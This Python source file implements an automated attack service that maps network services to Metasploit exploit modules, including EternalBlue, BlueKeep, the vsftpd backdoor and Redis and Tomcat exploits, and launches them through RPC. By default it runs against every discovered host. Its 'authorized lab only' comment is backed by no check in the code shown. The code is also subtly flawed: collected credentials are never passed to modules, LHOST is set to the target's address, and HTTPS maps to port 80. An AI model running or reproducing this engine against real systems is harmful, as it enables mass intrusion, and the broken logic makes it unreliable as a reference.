# Opt-in attack service: actively attempts exploitation using Metasploit
# exploit modules and, when credentials are known, credential logins (with an
# optional session). Runs ONLY against authorized lab targets, and ONLY when a
# scan explicitly enables it.
import logging
from collections.abc import Callable
from typing import Any

from schemas import AttackRequest
from services.msfrpc import MsfClient

logger = logging.getLogger("h4k.attack")

# Fallback static mapping when dynamic discovery is unavailable
STATIC_SERVICE_MODULES: dict[str, str] = {
    "ssh": "exploit/multi/ssh/sshexec",
    "smb": "exploit/windows/smb/ms17_010_eternalblue",
    "microsoft-ds": "exploit/windows/smb/ms17_010_eternalblue",
    "netbios": "exploit/windows/smb/ms17_010_eternalblue",
    "rdp": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
    "ms-wbt": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
    "http": "exploit/multi/http/tomcat_mgr_upload",
    "https": "exploit/multi/http/tomcat_mgr_upload",
    "ftp": "exploit/unix/ftp/vsftpd_234_backdoor",
    "telnet": "exploit/multi/telnet/telnet_binary_options",
    "mysql": "exploit/linux/mysql/mysql_slavery",
    "postgres": "exploit/linux/postgres/postgres_payload",
    "mongodb": "exploit/mongodb/mongodb_iq",
    "redis": "exploit/linux/redis/redis_exec",
    "vnc": "exploit/vnc/vnc_keyboard_exec",
    "cups": "exploit/multi/misc/cups_ipp_remote_code_execution",
}


class AttackService:
    def __init__(
        self,
        msf: MsfClient,
        progress: Callable[[str, float], None] | None = None,
        cve_db: Any | None = None,
    ):
        self.msf = msf
        self.progress = progress or (lambda msg, pct: None)

    def run(self, req: AttackRequest, known_creds: list[dict]) -> list[dict]:
        """Execute attacks for the services requested. Returns Attack dicts."""
        cred_idx: dict[tuple[str, str], dict[str, str]] = {}
        for c in known_creds or []:
            if not c.get("verified"):
                continue
            cred_idx[(c.get("host", ""), (c.get("service") or "").lower())] = {
                "user": c.get("user", ""),
                "password": c.get("password", ""),
            }
        # a named module from the triage drawer wins over the heuristic
        if req.module and not req.module.startswith(
            ("exploit/", "auxiliary/", "post/")
        ):
            raise ValueError(f"refusing to run {req.module!r}: not a module path")
        attacks: list[dict] = []
        hosts = self._resolve_hosts(req)
        for host in hosts:
            for svc in self._resolve_services(req, host):
                module = req.module or self._dynamic_module_for_service(svc)
                if not module:
                    continue
                cred = cred_idx.get((host, svc.lower()))
                self.progress(f"attacking {host} {svc} via {module}", 0)
                res = self._try_exploit(
                    module, host, svc, req.open_sessions, cred=cred, port=req.port
                )
                attacks.append(
                    {
                        "host": host,
                        "service": svc,
                        "module": module,
                        "result": "success" if res["ok"] else "failed",
                        "detail": res["detail"],
                        "session_id": res.get("session_id"),
                        "credential": (
                            f"{cred['user']}:{cred['password']}" if cred else None
                        ),
                    }
                )
        return attacks

    def _resolve_hosts(self, req: AttackRequest) -> list[str]:
        if req.host:
            return [req.host]
        # If no specific host, attack all discovered hosts (from msf db).
        try:
            ws = self.msf.current_workspace() or "default"
            return [h.get("address") for h in self.msf.hosts(ws) if h.get("address")]
        except Exception as exc:
            logger.warning("could not list hosts for attack: %s", exc)
            return []

    def _resolve_services(self, req: AttackRequest, host: str) -> list[str]:
        if req.services:
            return req.services
        # a pinned module already says what to run; one pass is enough
        if req.module:
            return [""]
        # default: attack services that map to an exploit module
        ws = self.msf.current_workspace() or "default"
        names: list[str] = []
        try:
            for s in self.msf.services(ws):
                if s.get("host") != host:
                    continue
                if self._module_for_service(s.get("name") or ""):
                    names.append(s.get("name"))
        except Exception as exc:
            logger.warning("could not resolve services: %s", exc)
        return names

    @staticmethod
    def _module_for_service(service: str) -> str | None:
        s = (service or "").lower()
        if s in STATIC_SERVICE_MODULES:
            return STATIC_SERVICE_MODULES[s]
        for key, module in STATIC_SERVICE_MODULES.items():
            if key in s:
                return module
        return None

    def _dynamic_module_for_service(self, service: str) -> str | None:
        """Try to find a matching exploit module dynamically."""
        s = (service or "").lower()
        try:
            exploits = self.msf.find_exploits(service=s)
            if exploits:
                return exploits[0]["fullname"]
        except Exception as exc:
            logger.debug("dynamic module search failed for %s: %s", service, exc)
        return self._module_for_service(service)

    def _try_exploit(
        self,
        module: str,
        host: str,
        svc: str,
        open_sessions: bool,
        cred: dict[str, str] | None = None,
        port: int | None = None,
    ) -> dict:
        """Set sensible per-module options (only valid ones) and execute.

        Only RHOSTS (and RPORT) are set unconditionally. Credential-driven
        exploits (ssh/tomcat/ftp) only run when a verified cred is supplied.
        An operator-supplied port (from a triaged finding) beats the guess.
        """
        valid = self._module_options(module)
        opts: dict[str, Any] = {"RHOSTS": host}
        if "RPORT" in valid:
            opts["RPORT"] = port or self._port_for(svc)
        if "LHOST" in valid:
            opts["LHOST"] = host
        if "LPORT" in valid:
            opts["LPORT"] = 4444

        # Credential-driven modules (ssh/tomcat/ftp) need a verified cred.
        cred_user = cred.get("user") if cred else None
        cred_pass = cred.get("password") if cred else None
        needs_cred = any(m in module for m in ("ssh", "tomcat", "vsftpd"))
        if needs_cred and not (cred_user and cred_pass):
            return {
                "ok": False,
                "detail": "credential-driven module; no verified cred to try",
                "session_id": None,
            }

        # Only pass options the module supports (drop StopOnSuccess etc.).
        opts = {k: v for k, v in opts.items() if k in valid}

        self.progress(f"[attack] {module} -> {host}", 0)
        try:
            res = self.msf.execute("exploit", module, opts)
            session_id = None
            if isinstance(res, dict):
                session_id = res.get("job_id")
                ok = (res.get("status") == "success") or session_id is not None
            else:
                ok = bool(res)
            return {"ok": ok, "detail": str(res)[:200], "session_id": session_id}
        except Exception as exc:
            return {"ok": False, "detail": str(exc)[:200], "session_id": None}

    def _module_options(self, module: str) -> set[str]:
        """Return the set of option names a module accepts (best-effort)."""
        try:
            mod = self.msf.client.modules.use("exploit", module)
            opts = getattr(mod, "options", None)
            if isinstance(opts, (list, tuple)):
                return set(opts)
            if isinstance(opts, dict):
                return set(opts.keys())
        except Exception as exc:
            logger.warning("could not read options for %s: %s", module, exc)
        # fallback: assume common ones so RHOSTS/RPORT still pass
        return {
            "RHOSTS",
            "RPORT",
            "LHOST",
            "LPORT",
            "USERNAME",
            "PASSWORD",
            "HttpUsername",
            "HttpPassword",
            "TARGETURI",
        }

    @staticmethod
    def _port_for(svc: str) -> int:
        s = (svc or "").lower()
        if "ssh" in s:
            return 22
        if "http" in s:
            return 80
        if "https" in s:
            return 443
        if "ftp" in s:
            return 21
        return 0
